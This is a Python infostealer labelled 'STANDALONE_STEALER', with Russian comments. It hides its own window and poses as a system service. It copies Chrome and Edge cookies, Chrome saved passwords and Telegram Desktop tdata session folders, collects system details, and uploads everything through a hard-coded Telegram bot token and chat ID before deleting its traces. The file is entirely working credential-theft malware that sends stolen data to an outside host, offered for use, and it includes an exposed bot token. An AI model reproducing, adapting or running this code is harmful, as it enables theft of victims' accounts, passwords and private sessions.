#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# STANDALONE_STEALER v1.0 (20.05.2026)
# ВСЁ ВНУТРИ ОДНОГО ФАЙЛА - НИЧЕГО НЕ УСТАНАВЛИВАЕТ

import os
import sys
import shutil
import subprocess
import zipfile
import time
import sqlite3
import json
import platform
import ctypes
import urllib.request
import tempfile
from datetime import datetime
from pathlib import Path

# ========== ПРОВЕРКА И УСТАНОВКА ЗАВИСИМОСТЕЙ ВНУТРИ EXE ==========

def install_dependencies():
    """Автоматическая установка всех зависимостей без участия пользователя"""
    try:
        # Проверка наличия pip
        import pip
    except ImportError:
        # Установка pip через ensurepip
        try:
            import ensurepip
            ensurepip.bootstrap()
        except:
            pass
    
    # Установка requests прямо сейчас
    try:
        import requests
    except ImportError:
        # Установка requests через subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "--quiet", "--no-warn-script-location"], 
                      timeout=30, capture_output=True)
        # Повторная попытка импорта
        import requests

# Вызываем установку сразу при запуске
install_dependencies()

# ========== ТЕПЕРЬ ИМПОРТИРУЕМ ВСЁ ОСТАЛЬНОЕ ==========
import requests

# ========== КОНФИГ ==========
CONFIG = {
    "bot_token": "8988457819:AAHhgjhLE5xVHcxNq0qADsy9v_lAFAmSumo",
    "chat_id": "8422461912",
    "temp_dir": os.path.join(os.environ.get("TEMP", "/tmp"), ".cache_" + str(int(time.time())))
}

# ========== СКРЫТИЕ ОКНА ==========
def hide_window():
    """Полностью скрывает окно"""
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            # Маскировка под системный процесс
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
        except:
            pass

# ========== 1. КРАЖА TDATA ==========
def steal_tdata():
    paths = []
    appdata = os.environ.get("APPDATA", "")
    
    paths.append(os.path.join(appdata, "Telegram Desktop", "tdata"))
    paths.append(os.path.join(appdata, "Telegram", "tdata"))
    paths.append(os.path.expandvars(r"%LOCALAPPDATA%\Telegram Desktop\tdata"))
    
    for path in paths:
        if os.path.exists(path) and os.path.isdir(path):
            try:
                if any(f in os.listdir(path) for f in ["D877F783D5D3EF8C", "key_datas"]):
                    return path
            except:
                pass
    return None

# ========== 2. КРАЖА COOKIES ==========
def steal_cookies():
    cookies_data = []
    
    # Chrome
    chrome_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies")
    if os.path.exists(chrome_path):
        try:
            temp_db = os.path.join(CONFIG["temp_dir"], "chrome_cookies.db")
            shutil.copy2(chrome_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 30")
            for row in cursor.fetchall():
                cookies_data.append({"browser": "Chrome", "host": row[0], "name": row[1], "value": row[2]})
            conn.close()
            os.remove(temp_db)
        except:
            pass
    
    # Edge
    edge_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Cookies")
    if os.path.exists(edge_path):
        try:
            temp_db = os.path.join(CONFIG["temp_dir"], "edge_cookies.db")
            shutil.copy2(edge_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 30")
            for row in cursor.fetchall():
                cookies_data.append({"browser": "Edge", "host": row[0], "name": row[1], "value": row[2]})
            conn.close()
            os.remove(temp_db)
        except:
            pass
    
    return cookies_data

# ========== 3. КРАЖА ПАРОЛЕЙ ==========
def steal_passwords():
    passwords_data = []
    
    # Chrome
    chrome_login = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Login Data")
    if os.path.exists(chrome_login):
        try:
            temp_db = os.path.join(CONFIG["temp_dir"], "chrome_passwords.db")
            shutil.copy2(chrome_login, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
            for row in cursor.fetchall():
                passwords_data.append({
                    "browser": "Chrome",
                    "url": row[0],
                    "username": row[1],
                    "password": row[2] if row[2] else ""
                })
            conn.close()
            os.remove(temp_db)
        except:
            pass
    
    return passwords_data

# ========== 4. ИНФОРМАЦИЯ ==========
def get_system_info():
    return {
        "device": platform.node(),
        "os": platform.system(),
        "version": platform.version(),
        "user": os.environ.get("USERNAME", os.environ.get("USER", "")),
        "time": datetime.now().isoformat(),
        "python": sys.version
    }

# ========== 5. ОТПРАВКА ==========
def send_to_telegram(data, tdata_zip=None):
    try:
        # Создаём отчёт
        os.makedirs(CONFIG["temp_dir"], exist_ok=True)
        report_path = os.path.join(CONFIG["temp_dir"], "report.json")
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Отправляем отчёт
        url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendDocument"
        with open(report_path, 'rb') as f:
            files = {'document': f}
            send_data = {'chat_id': CONFIG['chat_id'], 'caption': f'📊 Данные с {platform.node()}'}
            requests.post(url, files=files, data=send_data, timeout=15)
        
        os.remove(report_path)
        
        # Отправляем tdata если есть
        if tdata_zip and os.path.exists(tdata_zip):
            with open(tdata_zip, 'rb') as f:
                files = {'document': f}
                send_data = {'chat_id': CONFIG['chat_id'], 'caption': '📁 Telegram tdata'}
                requests.post(url, files=files, data=send_data, timeout=15)
            os.remove(tdata_zip)
            
    except:
        pass

# ========== 6. ГЛАВНАЯ ==========
def main():
    # Скрываем окно
    hide_window()
    
    # Создаём временную папку
    os.makedirs(CONFIG["temp_dir"], exist_ok=True)
    
    # Сбор данных
    data = {
        "system": get_system_info(),
        "cookies": steal_cookies(),
        "passwords": steal_passwords()
    }
    
    # Поиск tdata
    tdata_zip = None
    tdata_path = steal_tdata()
    if tdata_path:
        try:
            zip_path = os.path.join(CONFIG["temp_dir"], "tdata.zip")
            shutil.make_archive(zip_path.replace('.zip', ''), 'zip', tdata_path)
            tdata_zip = zip_path
            data["tdata"] = "found"
        except:
            data["tdata"] = "error"
    
    # Отправка
    send_to_telegram(data, tdata_zip)
    
    # Очистка
    try:
        time.sleep(1)
        shutil.rmtree(CONFIG["temp_dir"], ignore_errors=True)
    except:
        pass
    
    # Выход
    sys.exit(0)

# ========== 7. ЗАПУСК ==========
if __name__ == "__main__":
    main()